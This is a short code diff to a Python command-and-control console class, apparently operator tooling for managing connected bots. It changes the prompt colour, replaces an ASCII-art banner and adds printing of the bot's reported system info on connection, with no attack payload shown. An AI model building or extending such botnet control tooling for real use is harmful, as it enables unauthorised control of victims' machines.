@@ -5,33 +5,44 @@ from colorama import Fore, Style, init
 init(autoreset=True)
 
 class C2Console(cmd.Cmd):
-    prompt = Fore.GREEN + 'C2 > ' + Style.RESET_ALL
+    prompt = Fore.YELLOW + 'C2 > ' + Style.RESET_ALL
 
-    def __init__(self, client_socket, addr):
+    def __init__(self, client_socket, addr, bot_info):
         super().__init__()
         self.client = client_socket
         self.addr = addr
+
         ascii_art = r"""
-                   ()
-                 __/\__         
-        |\   .-"`      `"-.   /|
-        | \.'( ') (' ) (. )`./ |
-         \_                  _/
-           \  `~"'=::='"~`  /
-    ,       `-.__      __.-'       ,
-.---'\________( `""~~""` )________/'---.
- >   )       / `""~~~~""` \       (   < 
-'----`--..__/        -(-)- \__..--`----'
-            |_____ __ _____|
-            [_____[##]_____]  I HAVE BEEN CHOSEN...
-            |              |    FAREWELL MY FRIENDS...
-            \      ||      /     I GO ONTO A BETTER PLACE!
-             \     ||     /
-          .-"~`--._||_.--'~"-.
-         (_____,.--""--.,_____)
-    """
+                                   @        @                              
+                       @           @@       @@      @                  
+                       -@@@         #@@@@#  @%@%    @#                
+                         =@@@@      @@@@@@@   @@@* -@@%              
+                           -@@@@@@@@@   %@@@@@- :@@@@@@@#           
+                         --==++*@@@@@@@#  @@@@@@%   *@   @@        
+                .=#@@@@@@@@@@@@@@@@@@@@@@:                 @@@      
+                       =@@@@@@@@@@@@@@@@%                    @@    
+                          =@@@@@@@@@@@@@.   -..               @@    
+                  :#@@@@@@@@@@@@@@@%+.          *+-            %@    
+             .#*****#%@@@@@@@@@@#-...             :%@@%.        @#   
+                         @@@@@@@@@@*                -@*XX@      -@:  
+                      %@@@@@@@@@@@@@@               :@@XXX@@*+%@@+  
+                 +@@@@@@@@@@@@@@@@@@@                 @@@@@@@@@@@   
+            .=#@@@@@@@@@@@@@@@@@@@@@                   =@@@@@@@@@@@ 
+                    @@@@@@@@@@@@@@@                @@@@@@@@@@@@@@@@@
+                *@@@@@@@@@@====#@@@@%@@-+=       +%@@@@@@@@@@@@@@@@@@
+             #@@@@-                 %@@=@:     -*@@@@@@@@    @@@@@@@@
+          +@@@.                       %@@@-    #*@@@@@@         @@@@
+        %%.     .====+-  ===-.          @@@@@: @@@@@@@%          @@@ 
+     -=    .*@@@@+%@@+=+%@@@=::::       %@@@@@ #@@@@@@%           @  
+        :@@@@@@@@@@   @    %@@@@@#@      %@@@#  @@@@@@@@             
+      %@@@@@@    *   @*   :#.     @@     @@@@@* %@@@@@@@            
+    #@@@@@@@@@     @@@    %  @   @@#     @@@@@ %@@@@@@@@            
+   @@@@@@@@@#     @    @@@%   @@@@.     @@@@@@@@@::@@@@                      
+        """
         print(Fore.GREEN + ascii_art)
-        print(f"{Fore.CYAN}[+] Bot connected from {addr[0]}:{addr[1]}")
+        print(Fore.YELLOW + "[*] Bot connected with system info:")
+        print(Fore.CYAN + bot_info)
+        print(Fore.LIGHTBLACK_EX + f"[+] Connection from {self.addr[0]}:{self.addr[1]}")
 
     def do_exit(self, arg):
         """Exit the C2 session."""
